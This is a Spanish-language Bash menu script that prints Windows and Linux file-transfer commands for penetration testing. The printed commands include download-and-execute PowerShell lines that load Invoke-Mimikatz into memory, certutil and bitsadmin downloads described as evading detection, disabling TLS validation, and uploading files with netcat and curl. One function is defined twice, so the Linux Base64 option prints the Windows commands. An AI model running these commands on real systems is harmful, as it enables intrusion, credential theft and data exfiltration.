#!/bin/bash

# Colores para el menú
RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Variables globales para los campos comunes
TARGET_IP=""
TARGET_DOMAIN=""
USERNAME=""
PASSWORD=""
LOCAL_FILE=""
REMOTE_FILE=""
PORT=""

# Función para solicitar y validar IP
get_target_ip() {
    while true; do
        echo -n "Ingrese la IP objetivo (ej: 192.168.1.100): "
        read -r TARGET_IP
        if [[ $TARGET_IP =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
            IFS='.' read -r -a ip_parts <<< "$TARGET_IP"
            valid=true
            for part in "${ip_parts[@]}"; do
                if [ "$part" -gt 255 ] || [ "$part" -lt 0 ]; then
                    valid=false
                    break
                fi
            done
            if [ "$valid" = true ]; then
                break
            fi
        fi
        echo -e "${RED}IP inválida. Por favor, ingrese una IP válida.${NC}"
    done
}

# Función para solicitar y validar dominio
get_target_domain() {
    while true; do
        echo -n "Ingrese el dominio objetivo (ej: ejemplo.com): "
        read -r TARGET_DOMAIN
        if [[ $TARGET_DOMAIN =~ ^[a-zA-Z0-9][a-zA-Z0-9-]{1,61}[a-zA-Z0-9]\.[a-zA-Z]{2,}$ ]]; then
            break
        fi
        echo -e "${RED}Dominio inválido. Por favor, ingrese un dominio válido.${NC}"
    done
}

# Función para solicitar credenciales
get_credentials() {
    echo -n "Ingrese el nombre de usuario: "
    read -r USERNAME
    echo -n "Ingrese la contraseña: "
    read -rs PASSWORD
    echo
}

# Función para solicitar archivos
get_files() {
    echo -n "Ingrese la ruta del archivo local: "
    read -r LOCAL_FILE
    echo -n "Ingrese la ruta del archivo remoto: "
    read -r REMOTE_FILE
}

# Función para solicitar puerto
get_port() {
    while true; do
        echo -n "Ingrese el puerto (1-65535): "
        read -r PORT
        if [[ $PORT =~ ^[0-9]+$ ]] && [ "$PORT" -ge 1 ] && [ "$PORT" -le 65535 ]; then
            break
        fi
        echo -e "${RED}Puerto inválido. Por favor, ingrese un puerto válido.${NC}"
    done
}

# Función para solicitar URL
get_url() {
    while true; do
        echo -n "Ingrese la URL (ej: http://ejemplo.com): "
        read -r TARGET_URL
        if [[ $TARGET_URL =~ ^https?://[a-zA-Z0-9][a-zA-Z0-9-]{1,61}[a-zA-Z0-9]\.[a-zA-Z]{2,}(/.*)?$ ]]; then
            break
        fi
        echo -e "${RED}URL inválida. Por favor, ingrese una URL válida.${NC}"
    done
}

# Función para mostrar el menú principal
show_menu() {
    clear
    echo -e "${BLUE}=== Tr4nsg - Guía de Transferencia de Archivos ===${NC}"
    echo -e "${GREEN}1.${NC} Métodos Windows"
    echo -e "${GREEN}2.${NC} Métodos Linux"
    echo -e "${GREEN}3.${NC} Salir"
    echo
    echo -n "Seleccione una opción: "
}

# Función para mostrar el menú de Windows
show_windows_menu() {
    clear
    echo -e "${BLUE}=== Métodos de Transferencia en Windows ===${NC}"
    echo -e "${GREEN}1.${NC} Enviar archivos (Upload)"
    echo -e "${GREEN}2.${NC} Recibir archivos (Download)"
    echo -e "${GREEN}3.${NC} Volver al menú principal"
    echo
    echo -n "Seleccione una opción: "
}

# Función para mostrar el menú de Windows Upload
show_windows_upload_menu() {
    clear
    echo -e "${BLUE}=== Métodos de Envío en Windows ===${NC}"
    echo -e "${GREEN}1.${NC} PowerShell Web Uploads"
    echo -e "${GREEN}2.${NC} SMB Uploads"
    echo -e "${GREEN}3.${NC} FTP Uploads"
    echo -e "${GREEN}4.${NC} Volver al menú anterior"
    echo
    echo -n "Seleccione una opción: "
}

# Función para mostrar el menú de Windows Download
show_windows_download_menu() {
    clear
    echo -e "${BLUE}=== Métodos de Recepción en Windows ===${NC}"
    echo -e "${GREEN}1.${NC} PowerShell Web Downloads"
    echo -e "${GREEN}2.${NC} PowerShell Fileless Downloads"
    echo -e "${GREEN}3.${NC} SMB Transfers"
    echo -e "${GREEN}4.${NC} FTP Transfers"
    echo -e "${GREEN}5.${NC} Base64 Encode/Decode"
    echo -e "${GREEN}6.${NC} Métodos Alternativos (Bitsadmin, Certutil)"
    echo -e "${GREEN}7.${NC} Volver al menú anterior"
    echo
    echo -n "Seleccione una opción: "
}

# Función para mostrar el menú de Linux
show_linux_menu() {
    clear
    echo -e "${BLUE}=== Métodos de Transferencia en Linux ===${NC}"
    echo -e "${GREEN}1.${NC} Enviar archivos (Upload)"
    echo -e "${GREEN}2.${NC} Recibir archivos (Download)"
    echo -e "${GREEN}3.${NC} Volver al menú principal"
    echo
    echo -n "Seleccione una opción: "
}

# Función para mostrar el menú de Linux Upload
show_linux_upload_menu() {
    clear
    echo -e "${BLUE}=== Métodos de Envío en Linux ===${NC}"
    echo -e "${GREEN}1.${NC} SCP"
    echo -e "${GREEN}2.${NC} FTP"
    echo -e "${GREEN}3.${NC} cURL"
    echo -e "${GREEN}4.${NC} Netcat"
    echo -e "${GREEN}5.${NC} Volver al menú anterior"
    echo
    echo -n "Seleccione una opción: "
}

# Función para mostrar el menú de Linux Download
show_linux_download_menu() {
    clear
    echo -e "${BLUE}=== Métodos de Recepción en Linux ===${NC}"
    echo -e "${GREEN}1.${NC} Wget"
    echo -e "${GREEN}2.${NC} cURL"
    echo -e "${GREEN}3.${NC} PHP"
    echo -e "${GREEN}4.${NC} FTP"
    echo -e "${GREEN}5.${NC} Base64"
    echo -e "${GREEN}6.${NC} Netcat"
    echo -e "${GREEN}7.${NC} Python"
    echo -e "${GREEN}8.${NC} Volver al menú anterior"
    echo
    echo -n "Seleccione una opción: "
}

# Función para PowerShell Web Downloads
implement_powershell_web_downloads() {
    echo -e "${BLUE}=== PowerShell Web Downloads ===${NC}"
    
    get_url
    get_files
    
    echo -e "${YELLOW}Métodos disponibles:${NC}"
    echo "1. DownloadFile"
    echo "2. DownloadFileAsync"
    echo "3. Invoke-WebRequest"
    echo "4. Invoke-WebRequest con User Agent personalizado"
    echo

    echo -e "${GREEN}1. DownloadFile Method:${NC}"
    echo "(New-Object Net.WebClient).DownloadFile('$TARGET_URL', '$REMOTE_FILE')"
    echo

    echo -e "${GREEN}2. DownloadFileAsync Method:${NC}"
    echo "(New-Object Net.WebClient).DownloadFileAsync('$TARGET_URL', '$REMOTE_FILE')"
    echo

    echo -e "${GREEN}3. Invoke-WebRequest Method:${NC}"
    echo "Invoke-WebRequest -Uri '$TARGET_URL' -OutFile '$REMOTE_FILE'"
    echo

    echo -e "${GREEN}4. Invoke-WebRequest con User Agent:${NC}"
    echo "Invoke-WebRequest -Uri '$TARGET_URL' -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile '$REMOTE_FILE'"
    echo

    echo -e "${YELLOW}Notas importantes:${NC}"
    echo "1. Para evitar errores de SSL/TLS:"
    echo "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}"
    echo
    echo "2. Para evitar errores de IE:"
    echo "Invoke-WebRequest -Uri '$TARGET_URL' -OutFile '$REMOTE_FILE' -UseBasicParsing"
    echo
    echo "3. Para simular tráfico legítimo:"
    echo '$wc = New-Object System.Net.WebClient'
    echo '$wc.Headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"'
    echo '$wc.DownloadFile("$TARGET_URL", "$REMOTE_FILE")'
}

# Función para PowerShell Fileless Downloads
implement_powershell_fileless() {
    echo -e "${BLUE}=== PowerShell Fileless Downloads ===${NC}"
    
    echo -e "${YELLOW}Métodos disponibles:${NC}"
    echo "1. IEX (Invoke-Expression)"
    echo "2. IEX con Pipeline"
    echo

    echo -e "${GREEN}1. IEX Method:${NC}"
    echo "IEX (New-Object Net.WebClient).DownloadString('$TARGET_URL')"
    echo "Ejemplo: IEX (New-Object Net.WebClient).DownloadString('https://<snip>/Invoke-Mimikatz.ps1')"
    echo

    echo -e "${GREEN}2. IEX with Pipeline:${NC}"
    echo "(New-Object Net.WebClient).DownloadString('$TARGET_URL') | IEX"
    echo

    echo -e "${YELLOW}Notas importantes:${NC}"
    echo "1. El script se ejecuta directamente en memoria"
    echo "2. No se escribe nada en disco"
    echo "3. Útil para evadir detección de archivos"
}

# Función para SMB Transfers
implement_smb_transfers() {
    echo -e "${BLUE}=== SMB Transfers ===${NC}"
    
    get_target_ip
    get_credentials
    get_files
    
    echo -e "${YELLOW}¿Qué es SMB?${NC}"
    echo "El protocolo de bloque de mensajes del servidor (SMB) que se ejecuta en el puerto TCP/445"
    echo "es común en redes empresariales con servicios Windows. Permite transferir archivos"
    echo "desde y hacia servidores remotos."
    echo

    echo -e "${GREEN}1. Configuración del servidor SMB básico:${NC}"
    echo "sudo impacket-smbserver share -smb2support /tmp/smbshare"
    echo

    echo -e "${GREEN}2. Configuración del servidor SMB con autenticación:${NC}"
    echo "sudo impacket-smbserver share -smb2support /tmp/smbshare -user $USERNAME -password $PASSWORD"
    echo

    echo -e "${YELLOW}Métodos de transferencia:${NC}"
    echo -e "${GREEN}1. Copia directa (sin autenticación):${NC}"
    echo "copy \\\\$TARGET_IP\\share\\$LOCAL_FILE $REMOTE_FILE"
    echo
    echo -e "${GREEN}2. Copia con autenticación:${NC}"
    echo "net use n: \\\\$TARGET_IP\\share /user:$USERNAME $PASSWORD"
    echo "copy n:\\$LOCAL_FILE $REMOTE_FILE"
    echo
    echo -e "${GREEN}3. Usando PowerShell:${NC}"
    echo "Copy-Item -Path '\\\\$TARGET_IP\\share\\$LOCAL_FILE' -Destination '$REMOTE_FILE'"
    echo

    echo -e "${YELLOW}Notas importantes:${NC}"
    echo "1. Las nuevas versiones de Windows bloquean el acceso de invitados no autenticados"
    echo "2. Si recibe un error al usar 'copy filename \\IP\\sharename', intente montar primero"
    echo "3. Requiere permisos de administrador en Windows"
    echo "4. Puede ser bloqueado por políticas de seguridad"
    echo "5. Útil para transferencias internas"
}

# Función para Métodos Alternativos
implement_alternative_methods() {
    echo -e "${BLUE}=== Métodos Alternativos de Transferencia ===${NC}"
    
    echo -e "${YELLOW}1. Bitsadmin:${NC}"
    echo "bitsadmin /transfer n http://<IP>/file.exe C:\\Temp\\file.exe"
    echo

    echo -e "${YELLOW}2. Certutil:${NC}"
    echo "certutil.exe -verifyctl -split -f http://<IP>/file.exe"
    echo

    echo -e "${YELLOW}Notas importantes:${NC}"
    echo "1. Bitsadmin es una herramienta legítima de Windows"
    echo "2. Certutil es útil para evadir detección"
    echo "3. Ambos métodos son nativos de Windows"
}

# Función para Wget
implement_wget() {
    echo -e "${BLUE}=== Transferencia con Wget ===${NC}"
    
    echo -e "${YELLOW}Descarga básica:${NC}"
    echo "wget https://<URL>/file.sh -O /tmp/file.sh"
    echo

    echo -e "${YELLOW}Descarga con User Agent:${NC}"
    echo "wget --user-agent='Mozilla/5.0' https://<URL>/file.sh -O /tmp/file.sh"
    echo

    echo -e "${YELLOW}Descarga en segundo plano:${NC}"
    echo "wget -b https://<URL>/file.sh -O /tmp/file.sh"
    echo

    echo -e "${YELLOW}Notas importantes:${NC}"
    echo "1. Wget es una herramienta común en Linux"
    echo "2. Permite descargas recursivas"
    echo "3. Soporta múltiples protocolos (HTTP, HTTPS, FTP)"
}

# Función para cURL
implement_curl() {
    echo -e "${BLUE}=== Transferencia con cURL ===${NC}"
    
    echo -e "${YELLOW}Descarga básica:${NC}"
    echo "curl -o /tmp/file.sh https://<URL>/file.sh"
    echo

    echo -e "${YELLOW}Descarga con User Agent:${NC}"
    echo "curl -A 'Mozilla/5.0' -o /tmp/file.sh https://<URL>/file.sh"
    echo

    echo -e "${YELLOW}Subida de archivo:${NC}"
    echo "curl -F 'file=@/path/to/file' https://<URL>/upload"
    echo

    echo -e "${YELLOW}Notas importantes:${NC}"
    echo "1. cURL es más versátil que wget"
    echo "2. Soporta más protocolos"
    echo "3. Mejor para scripting"
}

# Función para PHP
implement_php() {
    echo -e "${BLUE}=== Transferencia con PHP ===${NC}"
    
    echo -e "${YELLOW}Descarga básica:${NC}"
    echo "php -r '\$file = file_get_contents(\"https://<URL>/file.sh\"); file_put_contents(\"file.sh\",\$file);'"
    echo

    echo -e "${YELLOW}Subida de archivo:${NC}"
    echo "php -r '\$ch = curl_init(); curl_setopt(\$ch, CURLOPT_URL, \"https://<URL>/upload\"); curl_setopt(\$ch, CURLOPT_POST, 1); curl_setopt(\$ch, CURLOPT_POSTFIELDS, [\"file\" => \"@/path/to/file\"]); curl_exec(\$ch);'"
    echo

    echo -e "${YELLOW}Notas importantes:${NC}"
    echo "1. Útil si PHP está disponible"
    echo "2. Puede evadir algunas restricciones"
    echo "3. Soporta múltiples protocolos"
}

# Función para SCP
implement_scp() {
    echo -e "${BLUE}=== Transferencia con SCP ===${NC}"
    
    get_target_ip
    get_credentials
    get_port
    get_files
    
    echo -e "${YELLOW}Subida de archivo:${NC}"
    echo "scp -P $PORT $LOCAL_FILE $USERNAME@$TARGET_IP:$REMOTE_FILE"
    echo

    echo -e "${YELLOW}Descarga de archivo:${NC}"
    echo "scp -P $PORT $USERNAME@$TARGET_IP:$REMOTE_FILE $LOCAL_FILE"
    echo

    echo -e "${YELLOW}Subida de directorio:${NC}"
    echo "scp -r -P $PORT $LOCAL_FILE $USERNAME@$TARGET_IP:$REMOTE_FILE"
    echo

    echo -e "${YELLOW}Notas importantes:${NC}"
    echo "1. Requiere acceso SSH"
    echo "2. Transferencia encriptada"
    echo "3. Útil para transferencias seguras"
}

# Función para Netcat
implement_netcat() {
    echo -e "${BLUE}=== Transferencia con Netcat ===${NC}"
    
    echo -e "${YELLOW}En el servidor (receptor):${NC}"
    echo "nc -l -p 1234 > file.sh"
    echo

    echo -e "${YELLOW}En el cliente (emisor):${NC}"
    echo "nc <IP> 1234 < file.sh"
    echo

    echo -e "${YELLOW}Transferencia encriptada (con cryptcat):${NC}"
    echo "cryptcat -l -p 1234 > file.sh"
    echo "cryptcat <IP> 1234 < file.sh"
    echo

    echo -e "${YELLOW}Notas importantes:${NC}"
    echo "1. Simple pero efectivo"
    echo "2. Útil cuando otros métodos están bloqueados"
    echo "3. Puede ser detectado por firewalls"
}

# Función para Python
implement_python() {
    echo -e "${BLUE}=== Transferencia con Python ===${NC}"
    
    echo -e "${YELLOW}Descarga con requests:${NC}"
    echo "python3 -c 'import requests; r = requests.get(\"$TARGET_URL\"); open(\"$LOCAL_FILE\", \"wb\").write(r.content)'"
    echo

    echo -e "${YELLOW}Servidor HTTP simple (para compartir archivos):${NC}"
    echo "python3 -m http.server 8000"
    echo

    echo -e "${YELLOW}Notas importantes:${NC}"
    echo "1. Requiere el módulo requests instalado"
    echo "2. Útil para scripting y automatización"
    echo "3. El servidor HTTP simple es útil para compartir archivos"
}

# Función para Base64 en Linux
implement_base64() {
    echo -e "${BLUE}=== Transferencia con Base64 en Linux ===${NC}"
    
    echo -e "${YELLOW}Codificar archivo:${NC}"
    echo "base64 file.sh > file.sh.b64"
    echo "cat file.sh | base64 > file.sh.b64"
    echo

    echo -e "${YELLOW}Decodificar archivo:${NC}"
    echo "base64 -d file.sh.b64 > file.sh"
    echo "cat file.sh.b64 | base64 -d > file.sh"
    echo

    echo -e "${YELLOW}Codificar y enviar por pipe:${NC}"
    echo "cat file.sh | base64 | nc -l -p 1234"
    echo "nc <IP> 1234 | base64 -d > file.sh"
    echo

    echo -e "${YELLOW}Codificar y pegar en terminal:${NC}"
    echo "base64 file.sh"
    echo "# Copiar la salida y en el destino:"
    echo "echo 'CONTENIDO_BASE64' | base64 -d > file.sh"
    echo

    echo -e "${YELLOW}Notas importantes:${NC}"
    echo "1. Útil para transferir archivos binarios como texto"
    echo "2. Puede evadir algunas restricciones de firewall"
    echo "3. Aumenta el tamaño del archivo en ~33%"
    echo "4. Útil para transferir archivos por chat o correo"
}

# Función para FTP Transfers en Windows
implement_ftp_transfers() {
    echo -e "${BLUE}=== FTP Transfers en Windows ===${NC}"
    
    echo -e "${YELLOW}1. Usando PowerShell:${NC}"
    echo '$ftp = "ftp://username:password@server.com/file.exe"'
    echo '$webclient = New-Object System.Net.WebClient'
    echo '$webclient.DownloadFile($ftp, "C:\Users\Public\file.exe")'
    echo

    echo -e "${YELLOW}2. Usando comando FTP:${NC}"
    echo "ftp server.com"
    echo "username"
    echo "password"
    echo "get file.exe"
    echo "bye"
    echo

    echo -e "${YELLOW}3. Usando script FTP:${NC}"
    echo "echo open server.com > ftp.txt"
    echo "echo username >> ftp.txt"
    echo "echo password >> ftp.txt"
    echo "echo get file.exe >> ftp.txt"
    echo "echo bye >> ftp.txt"
    echo "ftp -s:ftp.txt"
    echo

    echo -e "${YELLOW}Notas importantes:${NC}"
    echo "1. FTP envía credenciales en texto plano"
    echo "2. Considerar usar SFTP o FTPS para mayor seguridad"
    echo "3. Verificar permisos de escritura en el directorio destino"
}

# Función para Base64 en Windows
implement_base64() {
    echo -e "${BLUE}=== Base64 en Windows ===${NC}"
    
    echo -e "${YELLOW}1. Usando PowerShell:${NC}"
    echo '$content = Get-Content -Path "file.exe" -Encoding Byte'
    echo '$base64 = [Convert]::ToBase64String($content)'
    echo '$base64 | Out-File -FilePath "file.exe.b64"'
    echo

    echo -e "${YELLOW}2. Decodificar con PowerShell:${NC}"
    echo '$base64 = Get-Content -Path "file.exe.b64"'
    echo '$bytes = [Convert]::FromBase64String($base64)'
    echo '[IO.File]::WriteAllBytes("file.exe", $bytes)'
    echo

    echo -e "${YELLOW}3. Usando certutil:${NC}"
    echo "certutil -encode file.exe file.b64"
    echo "certutil -decode file.b64 file.exe"
    echo

    echo -e "${YELLOW}Notas importantes:${NC}"
    echo "1. Útil para transferir archivos binarios como texto"
    echo "2. Puede evadir algunas restricciones de firewall"
    echo "3. Aumenta el tamaño del archivo en ~33%"
}

# Función para PowerShell Web Uploads
implement_powershell_web_uploads() {
    echo -e "${BLUE}=== PowerShell Web Uploads ===${NC}"
    
    echo -e "${YELLOW}1. Usando Invoke-WebRequest:${NC}"
    echo '$filePath = "C:\Users\Public\file.exe"'
    echo '$url = "http://server.com/upload"'
    echo '$form = @{'
    echo '    file = Get-Item -Path $filePath'
    echo '}'
    echo 'Invoke-WebRequest -Uri $url -Method Post -Form $form'
    echo

    echo -e "${YELLOW}2. Usando WebClient:${NC}"
    echo '$wc = New-Object System.Net.WebClient'
    echo '$wc.UploadFile("http://server.com/upload", "C:\Users\Public\file.exe")'
    echo

    echo -e "${YELLOW}3. Usando curl.exe:${NC}"
    echo "curl.exe -F \"file=@C:\Users\Public\file.exe\" http://server.com/upload"
    echo

    echo -e "${YELLOW}Notas importantes:${NC}"
    echo "1. Verificar permisos de escritura en el servidor"
    echo "2. Considerar límites de tamaño de archivo"
    echo "3. Usar HTTPS para mayor seguridad"
}

# Función para SMB Uploads
implement_smb_uploads() {
    echo -e "${BLUE}=== SMB Uploads ===${NC}"
    
    echo -e "${YELLOW}1. Usando copy:${NC}"
    echo "copy C:\Users\Public\file.exe \\\\server\share\file.exe"
    echo

    echo -e "${YELLOW}2. Usando PowerShell:${NC}"
    echo "Copy-Item -Path 'C:\Users\Public\file.exe' -Destination '\\\\server\\share\\file.exe'"
    echo

    echo -e "${YELLOW}3. Usando net use:${NC}"
    echo "net use n: \\\\server\share /user:username password"
    echo "copy C:\Users\Public\file.exe n:\file.exe"
    echo "net use n: /delete"
    echo

    echo -e "${YELLOW}Notas importantes:${NC}"
    echo "1. Requiere permisos de escritura en el share"
    echo "2. Las nuevas versiones de Windows bloquean acceso anónimo"
    echo "3. Considerar usar credenciales válidas"
}

# Función para FTP Uploads
implement_ftp_uploads() {
    echo -e "${BLUE}=== FTP Uploads ===${NC}"
    
    echo -e "${YELLOW}1. Usando PowerShell:${NC}"
    echo '$ftp = "ftp://username:password@server.com/"'
    echo '$webclient = New-Object System.Net.WebClient'
    echo '$webclient.UploadFile($ftp, "C:\Users\Public\file.exe")'
    echo

    echo -e "${YELLOW}2. Usando comando FTP:${NC}"
    echo "ftp server.com"
    echo "username"
    echo "password"
    echo "put file.exe"
    echo "bye"
    echo

    echo -e "${YELLOW}3. Usando script FTP:${NC}"
    echo "echo open server.com > ftp.txt"
    echo "echo username >> ftp.txt"
    echo "echo password >> ftp.txt"
    echo "echo put file.exe >> ftp.txt"
    echo "echo bye >> ftp.txt"
    echo "ftp -s:ftp.txt"
    echo

    echo -e "${YELLOW}Notas importantes:${NC}"
    echo "1. FTP envía credenciales en texto plano"
    echo "2. Verificar permisos de escritura en el servidor FTP"
    echo "3. Considerar usar SFTP o FTPS para mayor seguridad"
}

# Bucle principal
while true; do
    show_menu
    read -r option

    case $option in
        1)
            while true; do
                show_windows_menu
                read -r win_option

                case $win_option in
                    1)
                        while true; do
                            show_windows_upload_menu
                            read -r win_upload_option

                            case $win_upload_option in
                                1) implement_powershell_web_uploads ;;
                                2) implement_smb_uploads ;;
                                3) implement_ftp_uploads ;;
                                4) break ;;
                                *) echo -e "${RED}Opción inválida${NC}" ;;
                            esac

                            echo
                            read -p "Presione Enter para continuar..."
                        done
                        ;;
                    2)
                        while true; do
                            show_windows_download_menu
                            read -r win_download_option

                            case $win_download_option in
                                1) implement_powershell_web_downloads ;;
                                2) implement_powershell_fileless ;;
                                3) implement_smb_transfers ;;
                                4) implement_ftp_transfers ;;
                                5) implement_base64 ;;
                                6) implement_alternative_methods ;;
                                7) break ;;
                                *) echo -e "${RED}Opción inválida${NC}" ;;
                            esac

                            echo
                            read -p "Presione Enter para continuar..."
                        done
                        ;;
                    3)
                        break
                        ;;
                    *)
                        echo -e "${RED}Opción inválida${NC}" ;;
                esac

                echo
                read -p "Presione Enter para continuar..."
            done
            ;;
        2)
            while true; do
                show_linux_menu
                read -r linux_option

                case $linux_option in
                    1)
                        while true; do
                            show_linux_upload_menu
                            read -r linux_upload_option

                            case $linux_upload_option in
                                1) implement_scp ;;
                                2) implement_ftp_transfers ;;
                                3) implement_curl ;;
                                4) implement_netcat ;;
                                5) break ;;
                                *) echo -e "${RED}Opción inválida${NC}" ;;
                            esac

                            echo
                            read -p "Presione Enter para continuar..."
                        done
                        ;;
                    2)
                        while true; do
                            show_linux_download_menu
                            read -r linux_download_option

                            case $linux_download_option in
                                1) implement_wget ;;
                                2) implement_curl ;;
                                3) implement_php ;;
                                4) implement_ftp_transfers ;;
                                5) implement_base64 ;;
                                6) implement_netcat ;;
                                7) implement_python ;;
                                8) break ;;
                                *) echo -e "${RED}Opción inválida${NC}" ;;
                            esac

                            echo
                            read -p "Presione Enter para continuar..."
                        done
                        ;;
                    3)
                        break
                        ;;
                    *)
                        echo -e "${RED}Opción inválida${NC}" ;;
                esac

                echo
                read -p "Presione Enter para continuar..."
            done
            ;;
        3)
            echo -e "${GREEN}Saliendo...${NC}"
            exit 0
            ;;
        *)
            echo -e "${RED}Opción inválida${NC}" ;;
    esac

    echo
    read -p "Presione Enter para continuar..."
done 
